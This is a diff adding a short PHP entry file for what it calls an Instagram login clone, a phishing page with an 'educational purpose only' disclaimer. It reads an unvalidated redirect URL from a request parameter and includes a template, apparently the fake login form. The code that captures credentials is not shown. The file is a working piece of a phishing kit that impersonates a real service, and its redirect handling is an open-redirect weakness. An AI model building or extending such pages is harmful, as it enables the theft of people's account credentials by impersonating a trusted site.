@@ -1,0 +1,22 @@
+<?php
+// This is made for educational purpose only
+// this demonstrate how simple are phishing attaks and we shhould be alert while browsing through internet 
+
+// warning!: do not use this against anyone without their permission
+?>
+
+<?php
+# Instagram login
+# credits: https://github.com/nikolaPokrajac/Instagram-login-clone
+
+if(isset($_REQUEST["r"]))
+{
+    $redirect_url =  $_REQUEST["r"];
+}
+else
+{
+    $redirect_url = "/?p=0";
+}
+
+include "templete1/index.php"
+?>
